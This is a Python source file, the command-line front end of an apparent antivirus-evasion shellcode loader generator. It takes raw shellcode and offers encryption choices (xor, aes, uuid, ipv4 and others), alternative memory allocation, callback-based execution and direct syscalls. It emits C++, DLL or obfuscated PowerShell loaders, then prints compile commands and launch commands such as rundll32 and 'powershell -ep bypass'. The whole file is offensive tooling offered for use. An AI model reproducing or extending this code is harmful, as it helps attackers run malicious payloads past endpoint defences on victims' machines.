#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2022-02-26 12:10:44
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

import argparse
import sys
import os
import time

from colorama import init, Fore
from Lib.compile import todll


class ScreenPrint:
	'''
	屏幕打印输出类
	:: param: None
	:: return: None
	'''


	def __init__(self):
		init(autoreset=True)
		print(Fore.YELLOW, end='')


	def info(self, text):
		print(Fore.WHITE + '[' + Fore.BLUE + time.strftime('%Y-%m-%d %H:%M:%S') + Fore.WHITE + '] [' + Fore.CYAN + 'Info' + Fore.WHITE + '] ' + str(text))


	def success(self, text):
		print(Fore.WHITE + '[' + Fore.BLUE + time.strftime('%Y-%m-%d %H:%M:%S') + Fore.WHITE + '] [' + Fore.GREEN + 'Nice' + Fore.WHITE + '] ' + str(text))


	def error(self, text):
		print(Fore.WHITE + '[' + Fore.BLUE + time.strftime('%Y-%m-%d %H:%M:%S') + Fore.WHITE + '] [' + Fore.RED + 'Error' + Fore.WHITE + '] ' + str(text))


def cmdLineParser():
	'''
	命令行参数解析函数
	:: param: None
	:: return: dict -> args
	'''

	parser = argparse.ArgumentParser(description='Input a raw file to bypass av and execute.', usage=Fore.WHITE + banner)

	# target
	parser.add_argument('-f', '--filename', default='payload.bin', help="Provide a shellcode in raw format.")
	parser.add_argument('-e', '--encryptType', help="Shellcode encryption method(e.g. b64, xor, aes, uuid, mac, ipv4, diy...)")
	parser.add_argument('--alloc', default='VirtualAllocExNuma', help="Function for allocating memory(e.g. Virtualalloc, MapViewOfFile, malloc...)")
	parser.add_argument('--callback', default='CertEnumSystemStore', help="Callback function used to execute your shellcode.")
	parser.add_argument('--syscall', action="store_true", help="Replace VirtualAlloc, the VritualProtect function is called by syscall.(Only x64)")
	parser.add_argument('--bit', default='x64', help="Is the shellcode 32-bit or 64-bit? Default is x64. (e.g. x86/x64)")
	parser.add_argument('--script', default='cpp', help="Generate binary file type. (e.g. cpp/dll)")
	parser.add_argument('--obf', action="store_true", help="Powershell file easyObf...")

	if len(sys.argv) == 1:
		sys.argv.append("-h")
	args = parser.parse_args()

	usableEncryptType = ['b64', 'xor', 'aes', 'uuid', 'mac', 'ipv4', 'diy']
	usableAllocMethod = ['VirtualAllocExNuma', 'VirtualAlloc', 'HeapAlloc']
	usableCallback = [i.replace('.cpp', '') for i in os.listdir('./template')]
	usableScript = ['cpp', 'dll', 'ps1']

	cprint = ScreenPrint()
	print(banner)

	if args.script not in usableScript:
		cprint.info("e.g. -script dll")
		cprint.error("The available script Type include: cpp, dll, ps1")
		sys.exit()


	if args.obf == True and args.script != 'ps1':
		cprint.info("e.g. --script ps1 --obf")
		cprint.error("--obf option only supports ps1 files")
		sys.exit()


	if args.encryptType not in usableEncryptType:
		cprint.info("e.g. -e b64")
		cprint.error("The available encryption methods include: " + ', '.join(i for i in usableEncryptType))
		sys.exit()


	if args.alloc not in usableAllocMethod:
		cprint.info("--alloc default is VirtualAllocExNuma")
		cprint.info("e.g. --callback VirtualAlloc")
		cprint.error("The available Alloc function include: VirtualAlloc, HeapAlloc...!")
		sys.exit()
	if args.alloc != 'VirtualAllocExNuma' and args.syscall:
		cprint.error("Do not set the --alloc parameter with syscall...!")
		sys.exit()


	if args.callback not in usableCallback:
		cprint.info("--callback default is CertEnumSystemStore")
		cprint.info("e.g. --callback EnumLanguageGroupLocalesW")
		cprint.error("The available callback function include: EnumLanguageGroupLocalesW, EnumerateLoadedModules, CopyFile2...!")
		sys.exit()


	if args.bit not in ['x86', 'x64']:
		cprint.error("Choose x86 or x64. (e.g. --bit x86)!")
		sys.exit()
	elif args.bit == 'x86' and args.syscall:
		cprint.error("syscall only supports 64-bit!")
		sys.exit()

	if args.script == 'ps1':
		args.alloc = ''
		args.callback = ''
		args.syscall = False

	return args


banner = r'''
  ____  _     _  ____  _      ____  _____ ____ _  __
 / ___\/ \ /|/ \/  __\/ \  /|/  __\/  __//   _Y |/ /
 |    \| |_||| ||  \/|| |  |||  \/||  \  |  / |   / 
 \___ || | ||| ||  __/| |/\|||    /|  /_ |  \_|   \ 
 \____/\_/ \|\_/\_/   \_/  \|\_/\_\\____\\____|_|\_\
 
							  By: BlueWhaleLab@王半仙            
'''



def writeFile(Content, scriptType):
	'''
	写文件函数
	:: param: string -> cppContent  string -> scriptType
	:: return: dict -> args
	'''

	if scriptType == 'cpp':
		with open('Output/decodeAndRun.cpp', 'w') as fw:
			fw.write(Content)
		fw.close()

	if scriptType == 'dll':
		Content = todll(Content).replace('::', '')
		with open('Output/dllmain.c', 'w') as fw:
			fw.write(Content)
		fw.close()

	if scriptType == 'ps1':
		with open('Output/runMe.ps1', 'w') as fw:
			fw.write(Content)
		fw.close()


def echo(args, CipherText, key, lib):
	'''
	帮助信息输出函数
	:: param: string -> lib, bool -> is_syscall, bool -> is_64, string -> scriptType
	:: return: None
	'''
	cprint = ScreenPrint()

	cprint.info("Shellcode File: " + Fore.YELLOW + args.filename)
	cprint.info("OutType: " + Fore.YELLOW + args.script)
	cprint.info("Bit: " + Fore.YELLOW + args.bit)
	cprint.info("EncryptType: " + Fore.YELLOW + args.encryptType)
	if args.script != 'ps1':
		cprint.info("AllocMethod: " + Fore.YELLOW + args.alloc)
		cprint.info("Use syscall: " + Fore.YELLOW + str(args.syscall))
	if key:
		cprint.info("XOR key: " + Fore.YELLOW + key)
	cprint.info("CipherText: " + Fore.YELLOW + CipherText[:50] + '...')


	if args.script == 'dll':
		cprint.info("OutputFile: " + Fore.YELLOW + "Output/dllmain.c")
		if args.bit == 'x86':
			cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "i686-w64-mingw32-gcc -m64 -c -w dllmain.c -shared")
			cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "i686-w64-mingw32-dllwrap -m64 -s --def dllmain.def *.o " + lib + " -o temp.dll")
			cprint.success("Use-Command: " + Fore.YELLOW + "C:\\Windows\\SysWOW64\\rundll32.exe temp.dll,StartW")
		else:
			if args.syscall:
				cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-gcc -m64 -c -w dllmain.c -shared -masm=intel")
				cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-dllwrap -m64 -s --def dllmain.def *.o " + lib + " -o temp.dll")
			else:
				cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-gcc -m64 -c -w dllmain.c -shared")
				cprint.success("Compile-DLL-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-dllwrap -m64 -s --def dllmain.def *.o " + lib + " -o temp.dll")
			cprint.success("Use-Command: " + Fore.YELLOW + "C:\\Windows\\System32\\rundll32.exe temp.dll,StartW")
		
	elif args.script == 'cpp':
		cprint.info("OutputFile: " + Fore.YELLOW + "Output/decodeAndRun.cpp")
		if args.bit == 'x86':
			cprint.success("Compile-Command: " + Fore.YELLOW + "i686-w64-mingw32-gcc -mwindows -s -w -o temp.exe decodeAndRun.cpp " + lib)
		else:
			if args.syscall:
				cprint.success("Compile-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-gcc -m64 -s -w -o temp.exe decodeAndRun.cpp " + lib + ' -masm=intel')
			else:
				cprint.success("Compile-Command: " + Fore.YELLOW + "x86_64-w64-mingw32-gcc -m64 -s -w -o temp.exe decodeAndRun.cpp " + lib)

	else:
		cprint.info("OutputFile: " + Fore.YELLOW + "Output/runMe.ps1")
		cprint.success("Use-Command: " + Fore.YELLOW + "powershell.exe -ep bypass -File runMe.ps1")


